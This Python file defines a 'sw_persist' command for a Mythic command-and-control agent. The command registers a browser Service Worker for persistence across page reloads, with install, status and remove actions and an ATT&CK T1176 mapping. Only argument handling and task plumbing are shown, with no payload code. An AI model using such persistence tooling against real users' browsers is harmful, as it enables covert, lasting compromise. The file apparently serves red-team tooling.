from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *


class SwPersistArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="action",
                type=ParameterType.ChooseOne,
                choices=["install", "status", "remove"],
                parameter_group_info=[ParameterGroupInfo(
                    required=False
                )],
                default_value="install",
                description="Action: install (register SW), status (list registrations), remove (unregister all)",
            ),
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            try:
                self.load_args_from_json_string(self.command_line)
            except:
                self.add_arg("action", self.command_line.strip())

    async def parse_dictionary(self, dictionary_arguments):
        self.load_args_from_dictionary(dictionary_arguments)


class SwPersistCommand(CommandBase):
    cmd = "sw_persist"
    needs_admin = False
    help_cmd = "sw_persist"
    description = "Attempt to register a Service Worker for persistence across page reloads. Requires HTTPS. Supports install/status/remove actions."
    version = 1
    author = "@grampae"
    attackmapping = ["T1176"]
    argument_class = SwPersistArguments
    attributes = CommandAttributes(
        supported_os=[SupportedOS.MacOS, SupportedOS.Linux, SupportedOS.Windows]
    )

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        action = task.args.get_arg("action") or "install"
        task.display_params = action
        return task

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp
